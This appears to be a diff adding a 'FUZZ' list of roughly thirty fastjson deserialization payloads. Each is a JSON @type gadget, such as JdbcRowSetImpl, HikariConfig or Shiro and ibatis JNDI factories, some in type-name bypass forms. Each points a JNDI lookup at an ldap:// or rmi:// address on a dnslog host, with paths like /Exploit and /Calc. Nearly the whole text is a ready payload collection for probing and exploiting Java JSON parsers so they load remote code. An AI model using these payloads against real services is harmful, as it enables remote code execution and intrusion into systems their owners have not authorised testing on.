@@ -33,3 +33,37 @@ Closing connection
 
 {"name":{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://xxx.2.xxx.xxx:10086/Exploit"},"autoCommit":true},age:12}
 
+FUZZ:
+
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://fast.bugseek.dnslog.cn/Object","autoCommit":true}
+{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://fast.bugseek.dnslog.cn/Object","autoCommit":true}}
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://fast.bugseek.dnslog.cn/jndi", "autoCommit":true}
+{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://fast.bugseek.dnslog.cn/jndi", "autoCommit":true}
+{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://fast.bugseek.dnslog.cn/Exploit", "autoCommit":true}
+{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://fast.bugseek.dnslog.cn/Exploit", "autoCommit":true}
+{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://fast.bugseek.dnslog.cn/Exploit"}}
+{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://fast.bugseek.dnslog.cn/Exploit","autoCommit":true}}
+{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://fast.bugseek.dnslog.cn/exploit"}"
+{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://fast.bugseek.dnslog.cn/Calc"}
+{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://fast.bugseek.dnslog.cn/Calc"}
+{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://fast.bugseek.dnslog.cn/Calc"}
+{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://fast.bugseek.dnslog.cn/Exploit", "autoCommit":true}}
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://fast.bugseek.dnslog.cn/Exploit","autoCommit":true}
+{"@type":"Lcom.sun.rowset.RowSetImpl;","dataSourceName":"rmi://fast.bugseek.dnslog.cn/Exploit","autoCommit":true}
+{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://fast.bugseek.dnslog.cn/Exploit","autoCommit":true};
+{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"rmi://fast.bugseek.dnslog.cn/Exploit","autoCommit":true]}
+{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://fast.bugseek.dnslog.cn/Exploit"}}
+{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://fast.bugseek.dnslog.cn/Exploit","autoCommit":true}}}
+{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"rmi://fast.bugseek.dnslog.cn/Calc"}
+{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"rmi://fast.bugseek.dnslog.cn/Calc"}
+{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://fast.bugseek.dnslog.cn/Calc"}
+{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://fast.bugseek.dnslog.cn/Calc"}
+{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"rmi://fast.bugseek.dnslog.cn/Calc"}
+{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://fast.bugseek.dnslog.cn/Calc","Object":"a"}
+{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"ldap://fast.bugseek.dnslog.cn/Calc"}
+{"@type":"org.apache.cocoon.components.slide.impl.JMSContentInterceptor", "parameters": {"@type":"java.util.Hashtable","java.naming.factory.initial":"com.sun.jndi.rmi.registry.RegistryContextFactory","topic-factory":"ldap://fast.bugseek.dnslog.cn/Calc"}, "namespace":""}
+{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://fast.bugseek.dnslog.cn/Calc"}}
+{"@type":"org.apache.xbean.propertyeditor.JndiConverter","asText":"ldap://fast.bugseek.dnslog.cn/Calc"}
+{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["ldap://fast.bugseek.dnslog.cn/Calc"], "Realms":[""]}
+{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://fast.bugseek.dnslog.cn/Calc"}
+{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://fast.bugseek.dnslog.cn/Calc"}
